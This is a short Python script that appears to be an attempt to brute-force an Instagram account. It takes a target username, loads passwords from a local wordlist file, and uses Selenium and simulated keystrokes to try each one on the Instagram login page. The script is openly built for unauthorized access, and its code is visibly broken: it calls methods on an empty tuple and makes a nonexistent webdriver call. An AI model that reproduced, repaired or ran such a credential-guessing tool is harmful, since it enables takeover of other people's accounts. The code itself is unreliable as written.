#email = input("enter your email: ").strip()
#user = email[:email.index('@')]
#domain = email[email.index('@')+ 1:]
#print(f"your name is {user} and email is {domain}")

import webbot
#from webbot import Browser
from selenium import webdriver
from pynput.keyboard import Key, Controller
import time
username = input('Username: ')
#كictionary = input('Choose Dictionary: ')

file = open(f'C:/Users/naplo/Desktop/pass.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()

web = ()
#web = webdriver.Chrome("/Users/naplo/Desktop/chromedriver")
keyboard = Controller()

webdriver.refresh('https://www.instagram.com/accounts/login/ajax/')
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type(username)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
for brute in bruteforce:
    web.type(brute, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)